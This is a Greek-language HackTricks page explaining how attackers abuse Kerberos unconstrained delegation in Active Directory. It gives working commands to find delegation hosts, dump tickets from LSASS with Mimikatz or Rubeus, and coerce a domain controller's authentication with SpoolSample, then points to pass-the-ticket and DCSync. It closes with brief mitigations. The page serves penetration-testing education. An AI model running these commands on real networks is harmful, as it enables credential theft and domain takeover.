# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Αυτή είναι μια δυνατότητα που μπορεί να ρυθμίσει ένας Διαχειριστής Τομέα σε οποιονδήποτε **Υπολογιστή** μέσα στον τομέα. Έτσι, κάθε φορά που ένας **χρήστης συνδέεται** στον Υπολογιστή, ένα **αντίγραφο του TGT** αυτού του χρήστη θα **σταλεί μέσα στο TGS** που παρέχεται από τον DC **και θα αποθηκευτεί στη μνήμη στο LSASS**. Έτσι, αν έχετε δικαιώματα Διαχειριστή στη μηχανή, θα μπορείτε να **dump the tickets και να προσποιηθείτε τους χρήστες** σε οποιαδήποτε μηχανή.

Έτσι, αν ένας διαχειριστής τομέα συνδεθεί σε έναν Υπολογιστή με ενεργοποιημένη τη δυνατότητα "Unconstrained Delegation", και έχετε τοπικά δικαιώματα διαχειριστή σε αυτή τη μηχανή, θα μπορείτε να dump the ticket και να προσποιηθείτε τον Διαχειριστή Τομέα οπουδήποτε (domain privesc).

Μπορείτε να **βρείτε αντικείμενα Υπολογιστή με αυτό το χαρακτηριστικό** ελέγχοντας αν το [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) χαρακτηριστικό περιέχει [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Μπορείτε να το κάνετε αυτό με ένα φίλτρο LDAP του ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, το οποίο είναι αυτό που κάνει το powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Φορτώστε το εισιτήριο του Διαχειριστή (ή του θύματος χρήστη) στη μνήμη με **Mimikatz** ή **Rubeus για ένα** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Περισσότερες πληροφορίες: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Περισσότερες πληροφορίες σχετικά με την Απεριόριστη αντιπροσώπευση στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Εξαναγκασμός Αυθεντικοποίησης**

Εάν ένας επιτιθέμενος είναι σε θέση να **συμβιβάσει έναν υπολογιστή που επιτρέπεται για "Απεριόριστη Αντιπροσώπευση"**, θα μπορούσε να **παραπλανήσει** έναν **εκτυπωτή** να **συνδεθεί αυτόματα** σε αυτόν **αποθηκεύοντας ένα TGT** στη μνήμη του διακομιστή.\
Στη συνέχεια, ο επιτιθέμενος θα μπορούσε να εκτελέσει μια **επίθεση Pass the Ticket για να προσποιηθεί** τον λογαριασμό υπολογιστή του εκτυπωτή. 

Για να κάνετε έναν εκτυπωτή να συνδεθεί σε οποιαδήποτε μηχανή μπορείτε να χρησιμοποιήσετε [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Αν το TGT προέρχεται από έναν ελεγκτή τομέα, μπορείτε να εκτελέσετε μια [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) και να αποκτήσετε όλους τους κατακερματισμούς από τον DC.\
[**Περισσότερες πληροφορίες σχετικά με αυτήν την επίθεση στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Βρείτε εδώ άλλους τρόπους για να **επιβάλετε μια αυθεντικοποίηση:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigation

- Περιορίστε τις συνδέσεις DA/Admin σε συγκεκριμένες υπηρεσίες
- Ορίστε "Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί" για προνομιακούς λογαριασμούς.

{{#include ../../banners/hacktricks-training.md}}
